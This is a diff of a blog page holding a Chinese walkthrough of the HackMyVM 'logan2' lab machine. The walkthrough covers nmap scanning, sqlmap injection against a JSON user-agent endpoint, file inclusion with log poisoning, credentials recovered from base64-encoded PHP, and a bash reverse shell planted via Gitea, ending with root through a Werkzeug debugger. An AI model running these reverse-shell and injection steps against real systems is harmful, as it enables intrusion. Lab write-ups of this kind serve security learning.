@@ -192,17 +192,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -236,13 +226,13 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>hmv_logan2</h1>
 <h1>0.简介</h1>
-<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=logan2" rel="nofollow">hackmyvm - logan2</a><br>
-<strong>难度</strong>：黄色<br>
-<strong>目标 IP</strong>：192.168.205.144<br>
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=logan2">hackmyvm - logan2</a>
+<strong>难度</strong>：黄色
+<strong>目标 IP</strong>：192.168.205.144
 <strong>本机 IP</strong>：192.168.205.141</p>
 <h1>1.扫描</h1>
-<p><code class="notranslate">nmap</code>起手</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<p><code>nmap</code>起手</p>
+<pre><code>┌──(kali㉿kali)-[~/test]
 └─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.144
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:59 CST
 Nmap scan report for 192.168.205.144
@@ -254,45 +244,45 @@ PORT     STATE SERVICE VERSION
 3000/tcp open  http    Golang net/http server
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port3000-TCP:V=7.95%I=7%D=1/20%Time=678E107B%P=x86_64-pc-linux-gnu%r(Ge
-SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:nericLines,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
 SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
-SF:20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
+SF:20Request&quot;)%r(GetRequest,1000,&quot;HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
 SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
 SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=abfb225a6c69b259;
 SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=1KgRX_Fci-rGge6j5LIyElk
 SF:Aqp46MTczNzM2MzU3ODgyMTcyMjg4Mg;\x20Path=/;\x20Expires=Tue,\x2021\x20Ja
 SF:n\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
 SF:IGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x20GMT\r\n\r\n&lt;!
-SF:DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en-US\"\x20class=\"theme-\"&gt;\n&lt;head\x
-SF:20data-suburl=\"\"&gt;\n\t&lt;meta\x20charset=\"utf-8\"&gt;\n\t&lt;meta\x20name=\"v
-SF:iewport\"\x20content=\"width=device-width,\x20initial-scale=1\"&gt;\n\t&lt;me
-SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\"&gt;\n\t&lt;title&gt;
+SF:DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en-US\&quot;\x20class=\&quot;theme-\&quot;&gt;\n&lt;head\x
+SF:20data-suburl=\&quot;\&quot;&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\t&lt;meta\x20name=\&quot;v
+SF:iewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=1\&quot;&gt;\n\t&lt;me
+SF:ta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\t&lt;title&gt;
 SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link
-SF:\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=\"use-c
-SF:redentials\"&gt;\n\t&lt;meta\x20name=\"theme-color\"\x20content=\"#6cc644\"&gt;\
-SF:n\t&lt;meta\x20name=\"author\"\x20content=\"Gitea\x20-\x20Git\x20with\x20a
-SF:\x20cup\x20of\x20tea\"\x20/&gt;\n\t&lt;meta\x20name=\"description\"\x20conten
-SF:t=\"Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
-SF:nless")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
+SF:\x20rel=\&quot;manifest\&quot;\x20href=\&quot;/manifest\.json\&quot;\x20crossorigin=\&quot;use-c
+SF:redentials\&quot;&gt;\n\t&lt;meta\x20name=\&quot;theme-color\&quot;\x20content=\&quot;#6cc644\&quot;&gt;\
+SF:n\t&lt;meta\x20name=\&quot;author\&quot;\x20content=\&quot;Gitea\x20-\x20Git\x20with\x20a
+SF:\x20cup\x20of\x20tea\&quot;\x20/&gt;\n\t&lt;meta\x20name=\&quot;description\&quot;\x20conten
+SF:t=\&quot;Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
+SF:nless&quot;)%r(Help,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
 SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
-SF:ad\x20Request")%r(HTTPOptions,1000,"HTTP/1\.0\x20404\x20Not\x20Found\r\
+SF:ad\x20Request&quot;)%r(HTTPOptions,1000,&quot;HTTP/1\.0\x20404\x20Not\x20Found\r\
 SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en
 SF:-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=aa
 SF:35213287ba9b56;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=ibf5qw0V
 SF:W54yX8vVkKfbkR8gck06MTczNzM2MzU3ODgzNzkzMjYzOA;\x20Path=/;\x20Expires=T
 SF:ue,\x2021\x20Jan\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Opt
 SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x
-SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\"en-US\"\x20class=\"the
-SF:me-\"&gt;\n&lt;head\x20data-suburl=\"\"&gt;\n\t&lt;meta\x20charset=\"utf-8\"&gt;\n\t&lt;m
-SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
-SF:ale=1\"&gt;\n\t&lt;meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edg
-SF:e\"&gt;\n\t&lt;title&gt;Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
-SF:20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link\x20rel=\"manifest\"\x20hre
-SF:f=\"/manifest\.json\"\x20crossorigin=\"use-credentials\"&gt;\n\t&lt;meta\x20n
-SF:ame=\"theme-color\"\x20content=\"#6cc644\"&gt;\n\t&lt;meta\x20name=\"author\"
-SF:\x20content=\"Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\"\x20/
-SF:&gt;\n\t&lt;meta\x20name=\"description\"\x20content=\"Gitea\x20\(Git\x20with\
-SF:x20a\x20c");
+SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en-US\&quot;\x20class=\&quot;the
+SF:me-\&quot;&gt;\n&lt;head\x20data-suburl=\&quot;\&quot;&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\t&lt;m
+SF:eta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-sc
+SF:ale=1\&quot;&gt;\n\t&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edg
+SF:e\&quot;&gt;\n\t&lt;title&gt;Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
+SF:20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link\x20rel=\&quot;manifest\&quot;\x20hre
+SF:f=\&quot;/manifest\.json\&quot;\x20crossorigin=\&quot;use-credentials\&quot;&gt;\n\t&lt;meta\x20n
+SF:ame=\&quot;theme-color\&quot;\x20content=\&quot;#6cc644\&quot;&gt;\n\t&lt;meta\x20name=\&quot;author\&quot;
+SF:\x20content=\&quot;Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\&quot;\x20/
+SF:&gt;\n\t&lt;meta\x20name=\&quot;description\&quot;\x20content=\&quot;Gitea\x20\(Git\x20with\
+SF:x20a\x20c&quot;);
 MAC Address: 08:00:27:B1:96:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
@@ -303,9 +293,9 @@ Nmap done: 1 IP address (1 host up) scanned in 27.94 seconds
 <p>80、3000都是http服务</p>
 <h1>2.踩点</h1>
 <p>80是欢迎页，有一个脚本。3000是Gitea通常没洞，所以我们先看脚本</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">http://192.168.205.144/script.js
+<pre lang="bash"><code>http://192.168.205.144/script.js
 
-document.addEventListener("DOMContentLoaded", function() {
+document.addEventListener(&quot;DOMContentLoaded&quot;, function() {
     fetch('/save-user-agent.php', {
         method: 'POST',
         body: JSON.stringify({ user_agent: navigator.userAgent }),
@@ -327,9 +317,9 @@ document.addEventListener("DOMContentLoaded", function() {
 
 </code></pre>
 <p>意思是它user_agent可以以json传点东西，开个burp试试</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564"><img src="https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564" alt="Image" style="max-width: 100%;"></a></p>
+<p><img src="https://github.com/user-attachments/assets/7eda310a-cb6a-4253-bcfc-7d775b7c4564" alt="Image" /></p>
 <p>sql注一下看有没有东西</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test/tmp]
 └─$ sqlmap -r sql.txt --batch
         ___
        __H__                                                                                                                         
@@ -376,8 +366,8 @@ it is recommended to perform only basic UNION tests if there is not at least one
 
 </code></pre>
 <p>不行，自己写一个试试</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
-└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{"user_agent":"1"}' --batch --current-db 
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test/tmp]
+└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{&quot;user_agent&quot;:&quot;1&quot;}' --batch --current-db 
         ___
        __H__                                                                                                                         
  ___ ___[']_____ ___ ___  {1.9#stable}                                                                                               
@@ -391,7 +381,7 @@ logan
 current database: 'logan'
 
 ┌──(kali㉿kali)-[~/test/tmp]
-└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{"user_agent":"1"}' --batch -D logan --tables     
+└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{&quot;user_agent&quot;:&quot;1&quot;}' --batch -D logan --tables     
         ___
        __H__                                                                                                                         
  ___ ___[(]_____ ___ ___  {1.9#stable}                                                                                                 
@@ -415,7 +405,7 @@ Database: logan
 
 
 ┌──(kali㉿kali)-[~/test/tmp]
-└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{"user_agent":"1"}' --batch -D logan -T users --dump
+└─$ sqlmap --url http://192.168.205.144/save-user-agent.php --method POST --data '{&quot;user_agent&quot;:&quot;1&quot;}' --batch -D logan -T users --dump
         ___
        __H__                                                                                                                         
  ___ ___[.]_____ ___ ___  {1.9#stable}                                                                                                 
@@ -435,49 +425,49 @@ Table: users
 
 </code></pre>
 <p>只有一个用户名和域名，我们将域名加上</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2"><img src="https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2" alt="Image" style="max-width: 100%;"></a></p>
+<p><img src="https://github.com/user-attachments/assets/6d62fde8-9b9e-47e5-8861-1658bae184b2" alt="Image" /></p>
 <p>试试有没有文件包含</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea"><img src="https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea" alt="Image" style="max-width: 100%;"></a></p>
+<p><img src="https://github.com/user-attachments/assets/9660a109-bcae-4ede-ba5f-2ccf553a07ea" alt="Image" /></p>
 <p>存在文件包含，尝试读取密钥，无果。看看存不存在日志注入</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee"><img src="https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee" alt="Image" style="max-width: 100%;"></a></p>
+<p><img src="https://github.com/user-attachments/assets/3b1e466f-27cd-404c-a5cc-e812af4e6cee" alt="Image" /></p>
 <p>存在，尝试注入</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b"><img src="https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b" alt="Image" style="max-width: 100%;"></a></p>
+<p><img src="https://github.com/user-attachments/assets/c15708fd-3b31-4bc3-8778-6dc9da12fe2b" alt="Image" /></p>
 <p>嘻嘻</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c"><img src="https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c" alt="Image" style="max-width: 100%;"></a></p>
+<p><img src="https://github.com/user-attachments/assets/d6647484-800d-4bf2-98c7-09e15435ff1c" alt="Image" /></p>
 <p>不嘻嘻，容易的都给它禁了</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7"><img src="https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7" alt="Image" style="max-width: 100%;"></a></p>
+<p><img src="https://github.com/user-attachments/assets/43e262e5-1441-4451-a648-11601dbdd8d7" alt="Image" /></p>
 <p>还一分钟清一次，考验手速是吧？</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a"><img src="https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a" alt="Image" style="max-width: 100%;"></a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd"><img src="https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd" alt="Image" style="max-width: 100%;"></a></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<p><img src="https://github.com/user-attachments/assets/837e96ef-975c-44b9-a745-42b61d73363a" alt="Image" /></p>
+<p><img src="https://github.com/user-attachments/assets/57f4d48e-140e-4f6a-a9da-87a65a12bccd" alt="Image" /></p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ echo 'PD9waHAKCQoJJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKCSR1c2VybmFtZSA9ICJsb2dhbiI7CgkkcGFzc3dvcmQgPSAiU3VwZXJfbG9nYW4xMjM0IjsKCSRkYm5hbWUgPSAibG9nYW4iOwoKCS8vIENyZWF0ZSBjb25uZWN0aW9uCgkkY29ubiA9IG5ldyBteXNxbGkoJHNlcnZlcm5hbWUsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGJuYW1lKTsKCS8vIENoZWNrIGNvbm5lY3Rpb24KCWlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewoJICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwoJfQoKPz4K' |base64 -d
 &lt;?php
 
-        $servername = "localhost";
-        $username = "logan";
-        $password = "Super_logan1234";
-        $dbname = "logan";
+        $servername = &quot;localhost&quot;;
+        $username = &quot;logan&quot;;
+        $password = &quot;Super_logan1234&quot;;
+        $dbname = &quot;logan&quot;;
 
         // Create connection
         $conn = new mysqli($servername, $username, $password, $dbname);
         // Check connection
         if ($conn-&gt;connect_error) {
-          die("Connection failed: " . $conn-&gt;connect_error);
+          die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
         }
 
 ?&gt;
 
 </code></pre>
 <p>登录Gitea</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c"><img src="https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c" alt="Image" style="max-width: 100%;"></a></p>
+<p><img src="https://github.com/user-attachments/assets/87309749-0e27-4dc1-bf6a-09cb1b54d57c" alt="Image" /></p>
 <p>改个shell上去</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">#!/bin/sh
-bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1"
+<pre lang="bash"><code>#!/bin/sh
+bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1&quot;
 省略
 </code></pre>
 <p>交个文件上去</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a"><img src="https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a" alt="Image" style="max-width: 100%;"></a></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<p><img src="https://github.com/user-attachments/assets/e9aaf4dc-fb75-4f1c-98d5-583ffdd77f4a" alt="Image" /></p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8888
 listening on [any] 8888 ...
 connect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 55202
@@ -489,7 +479,7 @@ uid=104(git) gid=113(git) groups=113(git)
 </code></pre>
 <h1>3. 获得稳定的 Shell</h1>
 <p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash  
+<pre lang="bash"><code>script /dev/null -c bash  
 ctrl+z  
 stty raw -echo; fg  
 reset xterm  
@@ -499,7 +489,7 @@ export SHELL=/bin/bash
 stty rows 59 cols 236
 </code></pre>
 <h1>4.提权</h1>
-<pre lang="bash" class="notranslate"><code class="notranslate">git@logan2:~/gitea-repositories/logan/future_web.git$ sudo -l
+<pre lang="bash"><code>git@logan2:~/gitea-repositories/logan/future_web.git$ sudo -l
 Matching Defaults entries for git on logan2:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
 
@@ -580,8 +570,8 @@ Press CTRL+C to quit
 
 </code></pre>
 <p>熟悉的配方，那就简单了（PIN都给了Debugger PIN: 632-008-714）</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9"><img src="https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9" alt="Image" style="max-width: 100%;"></a></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<p><img src="https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9" alt="Image" /></p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8889                                  
 listening on [any] 8889 ...
 connect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 58630
@@ -589,7 +579,8 @@ root@logan2:/tmp# id
 id
 uid=0(root) gid=0(root) groups=0(root)
 
-</code></pre></div>
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -614,7 +605,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -661,70 +652,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
